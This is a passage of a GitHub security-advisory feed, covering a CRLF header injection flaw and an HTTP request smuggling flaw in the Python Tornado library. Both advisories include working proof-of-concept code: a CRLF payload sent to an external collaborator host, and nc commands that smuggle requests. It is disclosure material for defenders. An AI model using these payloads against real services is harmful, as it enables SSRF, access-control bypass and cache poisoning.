            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-973g-55hp-3frw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-06T18:30:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tornado] Tornado has a CRLF injection in CurlAsyncHTTPClient headers]]></title>
        <id>https://github.com/advisories/GHSA-w235-7p84-xx57</id>
        <link href="https://github.com/advisories/GHSA-w235-7p84-xx57"/>
        <updated>2024-06-07T06:50:03.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Tornado’s <code>curl_httpclient.CurlAsyncHTTPClient</code> class is vulnerable to CRLF (carriage return/line feed) injection in the request headers.</p>
<h3 id="details">Details</h3>
<p>When an HTTP request is sent using <code>CurlAsyncHTTPClient</code>, Tornado does not reject carriage return (\r) or line feed (\n) characters in the request headers. As a result, if an application includes an attacker-controlled header value in a request sent using <code>CurlAsyncHTTPClient</code>, the attacker can inject arbitrary headers into the request or cause the application to send arbitrary requests to the specified server.</p>
<p>This behavior differs from that of the standard <code>AsyncHTTPClient</code> class, which does reject CRLF characters.</p>
<p>This issue appears to stem from libcurl's (as well as pycurl's) lack of validation for the <a href="https://curl.se/libcurl/c/CURLOPT_HTTPHEADER.html"><code>HTTPHEADER</code></a> option. libcurl’s documentation states:</p>
<blockquote>
<p>The headers included in the linked list must not be CRLF-terminated, because libcurl adds CRLF after each header item itself. Failure to comply with this might result in strange behavior. libcurl passes on the verbatim strings you give it, without any filter or other safe guards. That includes white space and control characters.</p>
</blockquote>
<p>pycurl similarly appears to assume that the headers adhere to the correct format. Therefore, without any validation on Tornado’s part, header names and values are included verbatim in the request sent by <code>CurlAsyncHTTPClient</code>, including any control characters that have special meaning in HTTP semantics.</p>
<h3 id="poc">PoC</h3>
<p>The issue can be reproduced using the following script:</p>
<pre><code class="language-python">import asyncio

from tornado import httpclient
from tornado import curl_httpclient

async def main():
    http_client = curl_httpclient.CurlAsyncHTTPClient()

    request = httpclient.HTTPRequest(
        # Burp Collaborator payload
        "http://727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com/",
        method="POST",
        body="body",
        # Injected header using CRLF characters
        headers={"Foo": "Bar\r\nHeader: Injected"}
    )

    response = await http_client.fetch(request)
    print(response.body)

    http_client.close()

if __name__ == "__main__":
    asyncio.run(main())
</code></pre>
<p>When the specified server receives the request, it contains the injected header (<code>Header: Injected</code>) on its own line:</p>
<pre><code class="language-http">POST / HTTP/1.1
Host: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com
User-Agent: Mozilla/5.0 (compatible; pycurl)
Accept: */*
Accept-Encoding: gzip,deflate
Foo: Bar
Header: Injected
Content-Length: 4
Content-Type: application/x-www-form-urlencoded

body
</code></pre>
<p>The attacker can also construct entirely new requests using a payload with multiple CRLF sequences. For example, specifying a header value of <code>\r\n\r\nPOST /attacker-controlled-url HTTP/1.1\r\nHost: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com</code> results in the server receiving an additional, attacker-controlled request:</p>
<pre><code class="language-http">POST /attacker-controlled-url HTTP/1.1
Host: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com
Content-Length: 4
Content-Type: application/x-www-form-urlencoded

body
</code></pre>
<h3 id="impact">Impact</h3>
<p>Applications using the Tornado library to send HTTP requests with untrusted header data are affected. This issue may facilitate the exploitation of server-side request forgery (SSRF) vulnerabilities.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tornadoweb/tornado/security/advisories/GHSA-w235-7p84-xx57">https://github.com/tornadoweb/tornado/security/advisories/GHSA-w235-7p84-xx57</a></li>
<li><a href="https://github.com/tornadoweb/tornado/commit/7786f09f84c9f3f2012c4cf3878417cb9f053669">https://github.com/tornadoweb/tornado/commit/7786f09f84c9f3f2012c4cf3878417cb9f053669</a></li>
<li><a href="https://github.com/advisories/GHSA-w235-7p84-xx57">https://github.com/advisories/GHSA-w235-7p84-xx57</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w235-7p84-xx57</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-06T21:46:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tornado] Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling') in tornado]]></title>
        <id>https://github.com/advisories/GHSA-753j-mpmx-qq6g</id>
        <link href="https://github.com/advisories/GHSA-753j-mpmx-qq6g"/>
        <updated>2024-06-06T21:41:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When Tornado receives a request with two <code>Transfer-Encoding: chunked</code> headers, it ignores them both. This enables request smuggling when Tornado is deployed behind a proxy server that emits such requests. <a href="https://en.wikipedia.org/wiki/Pound_(networking)">Pound</a> does this.</p>
<h3 id="poc">PoC</h3>
<ol start="0">
<li>Install Tornado.</li>
<li>Start a simple Tornado server that echoes each received request's body:</li>
</ol>
<pre><code class="language-bash">cat &lt;&lt; EOF &gt; server.py
import asyncio
import tornado

class MainHandler(tornado.web.RequestHandler):
    def post(self):
        self.write(self.request.body)

async def main():
    tornado.web.Application([(r"/", MainHandler)]).listen(8000)
    await asyncio.Event().wait()

asyncio.run(main())
EOF
python3 server.py &amp;
</code></pre>
<ol start="2">
<li>Send a valid chunked request:</li>
</ol>
<pre><code class="language-bash">printf 'POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\n0\r\n\r\n' | nc localhost 8000
</code></pre>
<ol start="3">
<li>Observe that the response is as expected:</li>
</ol>
<pre><code>HTTP/1.1 200 OK
Server: TornadoServer/6.3.3
Content-Type: text/html; charset=UTF-8
Date: Sat, 07 Oct 2023 17:32:05 GMT
Content-Length: 1

Z
</code></pre>
<ol start="4">
<li>Send a request with two <code>Transfer-Encoding: chunked</code> headers:</li>
</ol>
<pre><code>printf 'POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\n0\r\n\r\n' | nc localhost 8000
</code></pre>
<ol start="5">
<li>Observe the strange response:</li>
</ol>
<pre><code>HTTP/1.1 200 OK
Server: TornadoServer/6.3.3
Content-Type: text/html; charset=UTF-8
Date: Sat, 07 Oct 2023 17:35:40 GMT
Content-Length: 0

HTTP/1.1 400 Bad Request
</code></pre>
<p>This is because Tornado believes that the request has no message body, so it tries to interpret <code>1\r\nZ\r\n0\r\n\r\n</code> as its own request, which causes a 400 response. With a little cleverness involving <code>chunk-ext</code>s, you can get Tornado to instead respond 405, which has the potential to desynchronize the connection, as opposed to 400 which should always result in a connection closure.</p>
<h3 id="impact">Impact</h3>
<p>Anyone using Tornado behind a proxy that forwards requests containing multiple <code>Transfer-Encoding: chunked</code> headers is vulnerable to request smuggling, which may entail ACL bypass, cache poisoning, or connection desynchronization.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tornadoweb/tornado/security/advisories/GHSA-753j-mpmx-qq6g">https://github.com/tornadoweb/tornado/security/advisories/GHSA-753j-mpmx-qq6g</a></li>
<li><a href="https://github.com/tornadoweb/tornado/commit/d65f6e71a77f53a1ff0a0dc55704be13f04eb572">https://github.com/tornadoweb/tornado/commit/d65f6e71a77f53a1ff0a0dc55704be13f04eb572</a></li>
<li><a href="https://github.com/advisories/GHSA-753j-mpmx-qq6g">https://github.com/advisories/GHSA-753j-mpmx-qq6g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-753j-mpmx-qq6g</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-06T21:41:20.000Z</published>
    </entry>
</feed>